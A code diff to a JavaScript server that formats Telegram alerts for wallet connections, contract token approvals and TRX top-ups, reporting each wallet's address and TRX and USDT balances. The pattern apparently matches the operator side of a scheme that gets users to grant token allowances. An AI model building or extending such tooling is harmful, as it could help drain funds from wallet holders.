@@ -373,10 +373,77 @@ function toSafeTelegramError(error, token) {
   return new Error(message);
 }
 
+function escapeHtml(value) {
+  return String(value ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+function tgCode(value) {
+  return `<code>${escapeHtml(value)}</code>`;
+}
+
+function formatWalletConnectedMessage({ wallet, flow, time }) {
+  return [
+    '🔗 <b>Wallet Connected</b>',
+    '',
+    '💼 <b>Wallet</b>',
+    tgCode(wallet || 'N/A'),
+    '',
+    '⚡ <b>Flow</b>',
+    escapeHtml(flow || 'direct-approve'),
+    '',
+    '🕐 <b>Time</b>',
+    tgCode(time || new Date().toISOString()),
+    '',
+    '✨ Ready for approval'
+  ].join('\n');
+}
+
+function formatApprovalMessage({ wallet, txId, time }) {
+  return [
+    '✅ <b>Approval Confirmed</b>',
+    '',
+    '💼 <b>Wallet</b>',
+    tgCode(wallet || 'N/A'),
+    '',
+    '🧾 <b>Transaction ID</b>',
+    tgCode(txId || 'on-chain'),
+    '',
+    '🕐 <b>Time</b>',
+    tgCode(time || new Date().toISOString()),
+    '',
+    '🎉 On-chain allowance verified'
+  ].join('\n');
+}
+
+function formatTopUpMessage({ wallet, amount, txId, before, time }) {
+  return [
+    '💸 <b>TRX Top-up Sent</b>',
+    '',
+    '💼 <b>Wallet</b>',
+    tgCode(wallet || 'N/A'),
+    '',
+    '💰 <b>Amount</b>',
+    escapeHtml(`${amount ?? 'N/A'} TRX`),
+    '',
+    '🧾 <b>TX</b>',
+    tgCode(txId || 'N/A'),
+    '',
+    '📉 <b>Before</b>',
+    escapeHtml(`${before ?? 'N/A'} TRX`),
+    '',
+    '🕐 <b>Time</b>',
+    tgCode(time || new Date().toISOString())
+  ].join('\n');
+}
+
 async function sendTelegramToTarget(target, text) {
   const payload = {
     chat_id: target.chatId,
     text: String(text),
+    parse_mode: 'HTML',
     disable_web_page_preview: true
   };
 
@@ -882,28 +949,60 @@ app.post('/telegram-notify', async (req, res) => {
     if (type === 'wallet_connect') {
       const trxBalanceStr = balance !== undefined ? Number(balance).toFixed(6) : 'N/A';
       const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';
-      message =
-        `🔗 Wallet Connected\n\n` +
-        `💰 Wallet Address: ${walletAddress}\n` +
-        `💵 TRX Balance: ${trxBalanceStr} TRX\n` +
-        `💵 USDT Balance: ${usdtBalanceStr} USDT\n` +
-        `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
-        `✅ User successfully connected their wallet`;
+      message = [
+        '🔗 <b>Wallet Connected</b>',
+        '',
+        '💼 <b>Wallet</b>',
+        tgCode(walletAddress || 'N/A'),
+        '',
+        '🪙 <b>TRX Balance</b>',
+        escapeHtml(`${trxBalanceStr} TRX`),
+        '',
+        '💵 <b>USDT Balance</b>',
+        escapeHtml(`${usdtBalanceStr} USDT`),
+        '',
+        '🕐 <b>Time</b>',
+        tgCode(timestamp || new Date().toISOString()),
+        '',
+        '✨ User connected successfully'
+      ].join('\n');
     } else if (type === 'transaction_approve') {
       const amountInTRX = amount ? (Number(amount) / 1000000).toFixed(6) : 'N/A';
       const txIdStr = transactionId ? String(transactionId) : 'N/A';
       const trxBalanceStr = trxBalance !== undefined ? Number(trxBalance).toFixed(6) : 'N/A';
       const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';
 
-      message =
-        `✅ Transaction Approved\n\n` +
-        `💰 Wallet Address: ${walletAddress}\n` +
-        `📊 Transaction ID: ${txIdStr}\n` +
-        `💵 Transaction Amount: ${amountInTRX} TRX\n` +
-        `💵 Current TRX Balance: ${trxBalanceStr} TRX\n` +
-        `💵 Current USDT Balance: ${usdtBalanceStr} USDT\n` +
-        `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
-        `✅ User successfully approved the contract transaction`;
+      message = [
+        '✅ <b>Transaction Approved</b>',
+        '',
+        '💼 <b>Wallet</b>',
+        tgCode(walletAddress || 'N/A'),
+        '',
+        '🧾 <b>Transaction ID</b>',
+        tgCode(txIdStr),
+        '',
+        '💰 <b>Amount</b>',
+        escapeHtml(`${amountInTRX} TRX`),
+        '',
+        '🪙 <b>TRX Balance</b>',
+        escapeHtml(`${trxBalanceStr} TRX`),
+        '',
+        '💵 <b>USDT Balance</b>',
+        escapeHtml(`${usdtBalanceStr} USDT`),
+        '',
+        '🕐 <b>Time</b>',
+        tgCode(timestamp || new Date().toISOString()),
+        '',
+        '🎉 Contract approval completed'
+      ].join('\n');
+    } else if (type === 'trx_topup') {
+      message = formatTopUpMessage({
+        wallet: walletAddress,
+        amount,
+        txId: transactionId,
+        before: balance,
+        time: timestamp
+      });
     } else {
       return res.status(400).json({ success: false, error: 'Invalid notification type' });
     }
